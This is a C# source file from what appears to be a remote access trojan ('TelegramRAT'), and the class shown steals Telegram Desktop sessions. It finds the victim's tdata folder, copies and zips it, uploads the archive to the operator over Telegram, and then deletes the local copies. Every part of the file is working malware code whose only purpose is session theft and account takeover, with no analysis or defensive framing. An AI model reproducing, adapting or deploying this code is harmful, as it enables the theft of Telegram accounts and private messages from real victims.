using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;

namespace TelegramRAT;

internal class TelegramGrabber
{
	private static bool in_folder;

	public static void get()
	{
		Process[] processesByName = Process.GetProcessesByName("Telegram");
		string tdata;
		if (processesByName.Length != 0)
		{
			tdata = Path.GetDirectoryName(processesByName[0].MainModule!.FileName) + "\\tdata\\";
			telegram.sendText("⚡\ufe0f Telegram session found by process. Please wait...");
			steal(tdata);
			return;
		}
		tdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata\\";
		if (Directory.Exists(tdata))
		{
			telegram.sendText("⚡\ufe0f Telegram session found in default path. Please wait...");
			steal(tdata);
		}
		else
		{
			telegram.sendText("\ud83d\udee0 Telegram default path and process not found");
		}
	}

	private static void steal(string tdata)
	{
		string text = Path.GetDirectoryName(config.InstallPath) + "\\tdata";
		string text2 = text + ".zip";
		if (!Directory.Exists(tdata))
		{
			telegram.sendText("\ud83d\udee0 tdata directory not found");
			return;
		}
		Directory.CreateDirectory(text);
		CopyAll(tdata, text);
		ZipFile.CreateFromDirectory(text, text2);
		telegram.sendFile(text2);
		File.Delete(text2);
		Directory.Delete(text, recursive: true);
	}

	private static void CopyAll(string fromDir, string toDir)
	{
		string[] files = Directory.GetFiles(fromDir);
		for (int i = 0; i < files.Length; i++)
		{
			CopyFile(files[i], toDir);
		}
		files = Directory.GetDirectories(fromDir);
		for (int i = 0; i < files.Length; i++)
		{
			CopyDir(files[i], toDir);
		}
	}

	private static void CopyFile(string s1, string toDir)
	{
		try
		{
			string fileName = Path.GetFileName(s1);
			if (!in_folder || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
			{
				string destFileName = toDir + "\\" + fileName;
				File.Copy(s1, destFileName);
			}
		}
		catch
		{
		}
	}

	private static void CopyDir(string s, string toDir)
	{
		try
		{
			in_folder = true;
			CopyAll(s, toDir + "\\" + Path.GetFileName(s));
			in_folder = false;
		}
		catch
		{
		}
	}
}
